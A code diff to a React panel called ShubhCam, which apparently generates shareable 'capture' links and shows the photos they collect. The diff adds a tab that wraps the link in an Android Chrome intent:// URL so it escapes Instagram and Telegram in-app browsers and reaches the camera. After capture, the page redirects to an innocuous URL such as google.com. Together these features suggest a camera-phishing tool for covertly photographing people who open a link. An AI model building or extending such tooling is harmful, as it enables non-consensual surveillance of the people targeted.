@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload } from "lucide-react";
+import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -17,7 +17,7 @@ interface CapturedPhoto {
 
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
-  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom">("link");
+  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome">("link");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [loading, setLoading] = useState(false);
   const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
@@ -31,7 +31,9 @@ const ShubhCam = () => {
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
-
+  
+  // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
+  const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
   // Load photos from Supabase
   const loadPhotos = async () => {
     setLoading(true);
@@ -195,35 +197,46 @@ const ShubhCam = () => {
         <button
           onClick={() => setActiveTab("link")}
           className={cn(
-            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide",
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide",
             activeTab === "link"
               ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
               : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
           )}
         >
-          <Zap className="w-4 h-4" /> LINK
+          <Zap className="w-3.5 h-3.5" /> LINK
+        </button>
+        <button
+          onClick={() => setActiveTab("chrome")}
+          className={cn(
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide border-x border-neon-pink/30",
+            activeTab === "chrome"
+              ? "bg-gradient-to-r from-neon-orange to-neon-orange/80 text-background shadow-[0_0_20px_hsl(var(--neon-orange)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-orange/10 hover:text-neon-orange"
+          )}
+        >
+          <Chrome className="w-3.5 h-3.5" /> CHROME
         </button>
         <button
           onClick={() => setActiveTab("custom")}
           className={cn(
-            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide border-x border-neon-pink/30",
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide border-r border-neon-pink/30",
             activeTab === "custom"
               ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
               : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
           )}
         >
-          <Code className="w-4 h-4" /> CUSTOM
+          <Code className="w-3.5 h-3.5" /> CUSTOM
         </button>
         <button
           onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
           className={cn(
-            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide",
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1.5 transition-all text-xs font-bold tracking-wide",
             activeTab === "photos"
               ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
               : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
           )}
         >
-          <Image className="w-4 h-4" /> ({photos.length})
+          <Image className="w-3.5 h-3.5" /> ({photos.length})
         </button>
       </div>
 
@@ -323,6 +336,122 @@ const ShubhCam = () => {
             >
               <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
             </Button>
+          </div>
+        </div>
+      ) : activeTab === "chrome" ? (
+        <div className="relative space-y-5">
+          {/* Chrome Intent Info */}
+          <div className="bg-gradient-to-r from-neon-orange/10 to-neon-yellow/10 rounded-xl p-4 border border-neon-orange/30 shadow-[inset_0_0_20px_hsl(var(--neon-orange)/0.1)]">
+            <h3 className="font-bold text-neon-orange mb-3 flex items-center gap-2">
+              <Chrome className="w-4 h-4" /> Chrome Intent Link
+            </h3>
+            <p className="text-sm text-foreground/80 mb-2">
+              Ye link Instagram/Telegram ke in-app browser se automatically Chrome me open hoga.
+            </p>
+            <ol className="text-sm text-foreground/70 space-y-2">
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-orange/20 text-neon-orange text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">1</span>
+                <span>In-app browser detect karta hai</span>
+              </li>
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-yellow/20 text-neon-yellow text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">2</span>
+                <span>Android pe auto Chrome redirect</span>
+              </li>
+              <li className="flex items-start gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-green/20 text-neon-green text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
+                <span>Chrome me camera capture hota hai</span>
+              </li>
+            </ol>
+          </div>
+
+          {/* Session ID */}
+          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-orange/30">
+            <span className="text-muted-foreground">Session:</span>
+            <span className="text-neon-orange font-mono font-bold tracking-wider">{sessionId}</span>
+          </div>
+
+          {/* Normal Link (with built-in detection) */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">✅</span>
+              <h3 className="text-neon-green font-bold tracking-wide text-sm">SMART LINK (Recommended)</h3>
+            </div>
+            <p className="text-xs text-muted-foreground mb-3">
+              Ye link automatically in-app browser detect karke Chrome me redirect karta hai.
+            </p>
+            <div className="flex gap-2">
+              <Input
+                value={captureLink}
+                readOnly
+                className="bg-background/50 border-neon-green/50 text-neon-green text-xs font-mono focus:border-neon-green focus:ring-neon-green/30"
+              />
+              <Button
+                variant="outline"
+                size="icon"
+                onClick={() => copyToClipboard(captureLink)}
+                className="border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] shrink-0 transition-all"
+              >
+                <Copy className="w-4 h-4" />
+              </Button>
+            </div>
+          </div>
+
+          {/* Direct Chrome Intent Link */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-orange/30">
+            <div className="flex items-center gap-2 mb-3">
+              <Chrome className="w-5 h-5 text-neon-orange" />
+              <h3 className="text-neon-orange font-bold tracking-wide text-sm">DIRECT CHROME INTENT</h3>
+            </div>
+            <p className="text-xs text-muted-foreground mb-3">
+              Android devices pe directly Chrome me open hoga (intent:// protocol use karta hai).
+            </p>
+            <div className="flex gap-2">
+              <Input
+                value={chromeIntentLink}
+                readOnly
+                className="bg-background/50 border-neon-orange/50 text-neon-orange text-xs font-mono focus:border-neon-orange focus:ring-neon-orange/30"
+              />
+              <Button
+                variant="outline"
+                size="icon"
+                onClick={() => copyToClipboard(chromeIntentLink)}
+                className="border-neon-orange text-neon-orange hover:bg-neon-orange/20 hover:shadow-[0_0_15px_hsl(var(--neon-orange)/0.4)] shrink-0 transition-all"
+              >
+                <Copy className="w-4 h-4" />
+              </Button>
+            </div>
+          </div>
+
+          {/* Warning */}
+          <div className="bg-neon-red/10 rounded-xl p-4 border border-neon-red/30">
+            <div className="flex items-start gap-3">
+              <span className="text-xl">⚠️</span>
+              <div>
+                <h4 className="text-neon-red font-bold text-sm mb-1">Important Notes</h4>
+                <ul className="text-xs text-foreground/70 space-y-1">
+                  <li>• Sirf Android devices pe kaam karta hai</li>
+                  <li>• iOS/iPhone supported nahi hai</li>
+                  <li>• Non-Chrome browsers me message dikhega</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          {/* Redirect URL */}
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">🔗</span>
+              <h3 className="text-neon-cyan font-bold tracking-wide text-sm">REDIRECT URL</h3>
+            </div>
+            <Input
+              value={redirectUrl}
+              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
+              placeholder="https://google.com"
+              className="bg-background/50 border-neon-cyan/50 text-neon-cyan focus:border-neon-cyan focus:ring-neon-cyan/30"
+            />
+            <p className="text-neon-purple text-xs mt-3">
+              💡 Camera capture ke baad is URL pe redirect hoga
+            </p>
           </div>
         </div>
       ) : activeTab === "custom" ? (
